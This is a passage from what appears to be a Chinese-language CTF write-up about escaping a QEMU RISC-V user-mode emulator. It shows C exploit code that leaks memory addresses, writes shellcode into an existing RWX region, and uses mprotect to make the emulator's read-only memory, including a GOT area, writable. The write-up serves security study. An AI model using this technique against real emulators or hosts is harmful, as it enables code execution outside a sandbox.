...
mprotect制造rwx段不成功，但是发现内存中有rwx段，尝试shellcode成功：
...
int main(){
    ...
    char * rwx_leak  = get_addr("rwx");
    char * qemu_leak = get_addr("qemu-riscv64");

    char * rwx_base; long long * qemu_base;
    sscanf(rwx_leak ,"%p",&rwx_base );
    sscanf(qemu_leak,"%p",&qemu_base);
    
    char * shellcode_addr     = rwx_base  + 0x7ffe000;
    long long * mprotect_got  = qemu_base + 0x7171C0/8;
    long long * ro_memory     = qemu_base + 0x6b7000/8;
    int ro_length             = 0x0061000;

    memcpy(shellcode_addr,shellcode,strlen(shellcode));
    mprotect(ro_memory,ro_length,6);
...
上面零交互的代码里有非常多的字符串处理函数`strstr,strtok,strdup`，把这玩意写进shellcode中难度比较大，故还是采取交互的方法，python处理泄露地址的过程：
